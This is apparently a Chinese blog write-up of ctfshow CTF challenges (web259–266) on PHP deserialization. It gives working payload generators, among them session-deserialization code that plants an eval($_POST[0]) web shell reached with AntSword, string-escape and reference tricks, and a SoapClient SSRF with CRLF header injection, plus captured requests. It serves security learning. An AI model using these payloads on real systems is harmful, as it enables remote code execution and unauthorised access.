<h2 id="做法-4"><a href="#做法-4" class="headerlink" title="做法"></a>做法</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    public $text = <span class="string">&quot;ctfshow_i_love_36D&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$object = <span class="keyword">new</span> A();</span><br><span class="line">echo serialize($object);</span><br></pre></td></tr></table></figure>

<p>/?ctfshow=O:1:”A”:1:{s:4:”text”;s:18:”ctfshow_i_love_36D”;}</p>
<h1 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h1><p><code>本题目基于 PHP5.6.40</code></p>
<h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>PHP序列化</li>
<li>修改 Cookie（editthiscookie）</li>
<li>base64编码</li>
</ul>
<h2 id="做法-5"><a href="#做法-5" class="headerlink" title="做法"></a>做法</h2><p>这题原来放在 /message.php 了，亏我还找半天这个 index.php 怎么注入。。。</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%202.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%202.png"></p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%203.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%203.png"></p>
<p>该题关键在于将 msg 的 token 设置为 admin</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$m</span> = <span class="keyword">new</span> message(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$m</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%204.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%204.png"></p>
<p>成功拿到flag</p>
<h1 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h1><p><code>本题目基于 PHP7.3.11</code></p>
<h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>利用字符串拼接注入</li>
<li>PHP Session 的反序列化漏洞</li>
<li>备份文件的压缩文件命名</li>
</ul>
<h2 id="做法-6"><a href="#做法-6" class="headerlink" title="做法"></a>做法</h2><p>看了 wp，存在<a href="http://www.zip,这指定了类型的谁想得到啊(晕/">www.zip，这指定了类型的谁想得到啊（晕</a></p>
<p>然后以为可以用通配符蒙混过关（/inc/inc.php），顺便试了一下sqlmap，结果发现有拦截sql注入</p>
<p>然后发现editthiscookie不好用了，弄得我以为是自己写的问题，坑啊</p>
<p>关注到 /inc/inc.php 上有一行</p>
<p><code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code></p>
<p>参考资料：<a href="https://www.mi1k7ea.com/2019/04/21/PHP-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.mi1k7ea.com/2019/04/21/PHP-session反序列化漏洞/</a></p>
<p>php 以 | 作为 key和value的分隔符。此处的User中destruct方法有一个file_put_contents，在session反序列化过程中可以利用到User这一个类。</p>
<p>构造下面的文件来尝试是否产生文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&quot;test.php&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&quot;&lt;?php&quot;</span> . <span class="string">&#x27; phpinfo(); ?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&quot;|&quot;</span> . serialize(<span class="variable">$u</span>));</span><br></pre></td></tr></table></figure>

<p>将输出的内容放入 cookies 中的 limit 字段，需要注意的是，在放入之前cookies需要先存在 PHPSESSID 字段及 limit 字段（先访问一次index.php，替换完以后再访问一次index.php），然后再访问（check.php）。</p>
<p>最后访问 log-test.php，查看是否生成 phpinfo();</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%205.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%205.png"></p>
<p>可以看到是正常生成的。将内容改为 </p>
<p><code>&lt;?php eval($POST[0]); ?&gt;</code>  （设置为’x’不知道为什么没法传进去，设置为0就好了）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&quot;test1.php&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&quot;&lt;?php&quot;</span> . <span class="string">&#x27; eval($_POST[0]); ?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&quot;|&quot;</span> . serialize(<span class="variable">$u</span>));</span><br></pre></td></tr></table></figure>

<p>使用 AntSword </p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%206.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%206.png"></p>
<p>配置完右键打开flag.php拿到flag</p>
<h1 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h1><p><code>本题目基于 PHP 5.6.40</code></p>
<h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>PHP的反序列化逃逸（字符串变长）</li>
</ul>
<h2 id="做法-7"><a href="#做法-7" class="headerlink" title="做法"></a>做法</h2><p>原题代码：index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=base64_encode(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>message.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 15:13:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 15:17:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考资料：</p>
<p><a href="https://blog.csdn.net/qq_43431158/article/details/108210822">https://blog.csdn.net/qq_43431158/article/details/108210822</a>（Web262）</p>
<p><a href="https://blog.csdn.net/qq_45521281/article/details/107135706">https://blog.csdn.net/qq_45521281/article/details/107135706</a>（两种序列化）</p>
<p>这里利用到了反序列化的逃逸，就是前面有一个看不懂的莫名其妙的将fuck替换为loveU的过程，这里就可以派上用场了。</p>
<p>因为将fuck替换为loveU其实是增加了字符串的长度。而反序列化中其中有一个字段是用来说明字符串的字符个数的，导致传进去的字符串被替换后刚刚好在<code>&quot;;</code>前被截断了。只要字符个数会有多出来，然后成功把后面的括号给包含与闭合，任务就算完成了。</p>
<p>由题目，我们的任务是将其token替换为admin，也就是只要后面这一段，要在$t上下手。</p>
<p><code>&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></p>
<p>这里一共新增27个字符，所以我们要写27个fuck。</p>
<p>拼接后参数t为</p>
<p><code>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></p>
<p>参数f和参数m随意设置，最后请求参数为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">f:<span class="number">1</span></span><br><span class="line">m:<span class="number">1</span></span><br><span class="line">t:fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%<span class="number">22</span>;s:<span class="number">5</span>:%<span class="number">22</span>token%<span class="number">22</span>;s:<span class="number">5</span>:%<span class="number">22</span>admin%<span class="number">22</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>访问index.php出现 <code>Your message has been sent</code> 后新增cookies msg，内容随便设置，访问message.php，获得flag</p>
<p>真是好累啊（擦汗）</p>
<p>同样的，对于反序列化字符长度减小，我们也可以更换思路，将原有的字符串顶包补足给前一个参数，然后我们再在后面添加修改。</p>
<p>比如这题，如果替换了一下，变成将loveU换成fuck那该怎么做呢？</p>
<p>我们同样可以选择修改t参数，让他把原来的后面的参数给吃了。原来的参数序列化后为 <code>&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code>，那我们就写26个loveU，让他把后面吃了，我们自己再补充 <code>&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code> ，就可以解决字符串减小的反序列化漏洞。</p>
<h1 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h1><h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>对象内变量指针</li>
</ul>
<h2 id="做法-8"><a href="#做法-8" class="headerlink" title="做法"></a>做法</h2><p>从代码可以看出来，这里的token是被替换过的，所以从token下手是没办法的。但是可以看到login处又有判断要求token和password相同，那有什么办法呢？</p>
<p>C语言里面讲过一个指针的思想，PHP上其实也可以应用，也可以被序列化，所以我们将password的值始终绑定到token上就可以了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>; <span class="comment">// 对password动手</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> ctfshowAdmin();</span><br><span class="line">    <span class="variable">$a</span>-&gt;password = &amp;<span class="variable">$a</span>-&gt;token;</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出 <code>O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;N;s:8:&quot;password&quot;;R:2;&#125;</code> ，丢到参数里拿到flag</p>
<h1 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h1><h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>正则表达式</li>
<li>PHP 函数/类命名不区分大小写</li>
</ul>
<h2 id="做法-9"><a href="#做法-9" class="headerlink" title="做法"></a>做法</h2><p>这题中可以看出，最后三行明显是不让你碰ctfshow这几个字，但题中的class偏偏是ctfshow，怎么办呢？</p>
<p>行吧，这题就是考php基础，千算万算没算到PHP的函数是不区分大小写的。</p>
<p>（以后可以留意正则最后面有没有加/i，没加就是不区分大小写）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> ctfshow());</span><br></pre></td></tr></table></figure>

<p>输出 <code>O:7:&quot;ctfshow&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;&#125;</code></p>
<p>将ctfshow任意一个字母改为大写，成功拿flag</p>
<p>绝！</p>
<h1 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h1><p><code>本题目基于 PHP7.3.11</code></p>
<h2 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li><a href="https://www.php.net/manual/en/class.soapclient.php">SoapClient</a>，在反序列化时利用PHP原生类</li>
<li>CRLF漏洞，即利用回车+换行（\r\n）注入到Header中</li>
</ul>
<h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>看flag.php的条件，首先要修改请求头XFF，使用ModHeader可以修改。同时要带上ctfshow的token，方可获得flag.txt。但看似简单，实际上直接请求flag.php就算作弊了，题目要求的应该是通过index.php来请求flag.php。</p>
<p>虽然但是，不知道index.php想干嘛，题目提示了个flag.php，其实也跟index.php没啥关系嘛</p>
<p>改header xff为127.0.0.1，同时post个token为ctfshow，成功。</p>
<h2 id="官方の梦"><a href="#官方の梦" class="headerlink" title="官方の梦"></a>官方の梦</h2><p>参考地址：</p>
<p><a href="https://blog.csdn.net/rfrder/article/details/113808539">https://blog.csdn.net/rfrder/article/details/113808539</a></p>
<p><a href="http://cn-sec.com/archives/145718.html">http://cn-sec.com/archives/145718.html</a></p>
<p><del>上面那个解都不知道哪个傻子做的，还以为做1+1=2呢</del></p>
<p>从 index.php 可以看出，该题打算在 index.php 中通过反序列化调用 flag.php 中的类，但题目中并没有明确地调用到flag.php。所以显然上述解法是错误的。SoapClient 是内置在 PHP 当中，可以直接被调用的一个类。</p>
<p>同时，利用请求头的CRLF漏洞，对请求头的 Content-Length 进行覆盖，使其读完请求头后忽略后续数据与请求头。参考资料如下：</p>
<p><a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">https://wooyun.js.org/drops/CRLF Injection漏洞的利用与实例分析.html</a></p>
<p>目前题目的目的就是要实例化 SoapClient，并对 <a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a> 发出post请求。多次尝试后，发现正常进行一个POST请求必须带上下面的参数，且缺一不可：</p>
<ul>
<li>请求方式，请求路径，HTTP版本</li>
<li>Host主机</li>
<li>Content-Type 内容类型</li>
<li>Content-Length 内容长度（用于截断后续请求）</li>
<li>同时，对于本题目，还需要补充 XFF。</li>
</ul>
<p>在telnet中尝试此操作</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">telnet aaa.challenge.ctf.show <span class="number">8080</span></span><br><span class="line">Trying <span class="number">1.116</span>.<span class="number">34.181</span>...</span><br><span class="line">Connected to aaa.challenge.ctf.show.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line"></span><br><span class="line">POST /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">4</span>dfd222c-c826-<span class="number">43e9</span>-bcd9-<span class="number">5</span>b2afef3dd68.challenge.ctf.show:<span class="number">8080</span></span><br><span class="line">X-Forwarded-<span class="keyword">For</span>: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">13</span></span><br><span class="line"></span><br><span class="line">token=ctfshow</span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Content-Type: text/html; charset=UTF-<span class="number">8</span></span><br><span class="line">Date: Mon, <span class="number">09</span> Aug <span class="number">2021</span> <span class="number">23</span>:<span class="number">16</span>:<span class="number">58</span> GMT</span><br><span class="line">Server: nginx/<span class="number">1.16</span>.<span class="number">1</span></span><br><span class="line">X-Powered-By: PHP/<span class="number">7.3</span>.<span class="number">11</span></span><br><span class="line">Content-Length: <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以发现返回的Content-Length为0，则成功放置flag.php。</p>
<p>同样的，在SoapClient中，我们要对Header进行下手，构造类似的头。为了区分头部和post内容，在头部和内容间应多一次回车换行。但SoapClient仅可修改User-Agent，所以我们要从User-Agent下手，修改后的User-Agent为</p>
<p><code>ThisIsKellysBrowser\r\nX-Forwarded-For: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow</code></p>
<p>我们尝试对其他IP发送一次Post请求并抓包，看看到底发生了什么</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// web259.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$request</span> = <span class="keyword">new</span> SoapClient(</span><br><span class="line">        <span class="literal">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;ThisIsKellysBrowser\r\nX-Forwarded-For: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>,</span><br><span class="line">                <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;useless&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://172.16.*.*/flag.php&#x27;</span></span><br><span class="line">            )</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$request</span>-&gt;getFlag();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$request</span>));</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Internet Protocol Version <span class="number">4</span>, Src: <span class="number">172.16</span>.*.*, Dst: <span class="number">172.16</span>.*.*</span><br><span class="line">Transmission Control Protocol, Src Port: <span class="number">58943</span>, Dst Port: <span class="number">80</span>, Seq: <span class="number">1</span>, Ack: <span class="number">1</span>, Len: <span class="number">681</span></span><br><span class="line">Hypertext Transfer Protocol</span><br><span class="line">    POST /flag.php HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">    Host: <span class="number">172.16</span>.*.*\r\n</span><br><span class="line">    Connection: Keep-Alive\r\n</span><br><span class="line">    User-Agent: ThisIsKellysBrowser\r\n</span><br><span class="line">    X-Forwarded-<span class="keyword">For</span>: <span class="number">127.0</span>.<span class="number">0.1</span>\r\n</span><br><span class="line">    Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">    Content-Length: <span class="number">13</span>\r\n</span><br><span class="line">    \r\n</span><br><span class="line">    [Full request URI: http:<span class="comment">//172.16.*.*/flag.php]</span></span><br><span class="line">    [HTTP request <span class="number">1</span>/<span class="number">1</span>]</span><br><span class="line">    File Data: <span class="number">13</span> bytes</span><br><span class="line">HTML Form URL Encoded: application/x-www-form-urlencoded</span><br><span class="line">    Form item: <span class="string">&quot;token&quot;</span> = <span class="string">&quot;ctfshow&quot;</span></span><br><span class="line">        Key: token</span><br><span class="line">        Value: ctfshow</span><br><span class="line">Hypertext Transfer Protocol</span><br><span class="line">    Leading CRLF previous message in the stream may have extra CRLF</span><br><span class="line">    Content-Type: text/xml; charset=utf-<span class="number">8</span>\r\n</span><br><span class="line">    SOAPAction: <span class="string">&quot;useless#getFlag&quot;</span>\r\n</span><br><span class="line">    Content-Length: <span class="number">374</span>\r\n</span><br><span class="line">    \r\n</span><br><span class="line">    File Data: <span class="number">374</span> bytes</span><br><span class="line">eXtensible Markup Language</span><br><span class="line">Hypertext Transfer Protocol</span><br><span class="line">    File Data: <span class="number">2</span> bytes</span><br><span class="line">    Data (<span class="number">2</span> bytes)</span><br></pre></td></tr></table></figure>

<p>可以看到，这位wireshark同学对我们刚发出的请求十分疑惑，理论上来说发出token=ctfshow以后客户端方面就该闭嘴了，没想到他还在啪啪啪地发着他的头，他想干啥呢，事实上在服务端接收的时候，也是接收完token=ctfshow后就不理你了，服务端会正常接收请求并返回内容，往后的内容会当成下一次的请求处理。</p>
<p>同时，毫无用处的uri也会在下方的SOAPAction中体现。不过我们的输入到token=ctfshow就结束了，所以后面的是真的没什么用。Host和路径会由SoapClient自动帮我们解析。</p>
<p>但是请求过程中发现了一个问题，如果请求头中xff没有设置为 <code>X-Forwarded-For: 127.0.0.1, 127.0.0.1</code> ，则会抛出错误</p>
<p><code>Fatal error: Uncaught SoapFault exception: [Client] looks like we got no XML document in /var/www/html/index.php:8 Stack trace: #0 /var/www/html/index.php(8): SoapClient-&gt;__call(&#39;getFlag&#39;, Array) #1 &#123;main&#125; thrown in /var/www/html/index.php on line 8</code></p>
<p>原因：在flag.php中，有一句不起眼的 <code>$ip = array_pop($xff)</code> ，会将第一个XFF IP去掉，导致 flag.php 没法拿到ip，真是太可恨了（握拳</p>
<p>所以，最终的payload应为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// web259.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$request</span> = <span class="keyword">new</span> SoapClient(</span><br><span class="line">        <span class="literal">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;ThisIsKellysBrowser\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>,</span><br><span class="line">                <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;useless&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span></span><br><span class="line">            )</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$request</span>-&gt;getFlag();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$request</span>));</span><br></pre></td></tr></table></figure>

<p>然后访问 /flag.txt ，获取flag。</p>
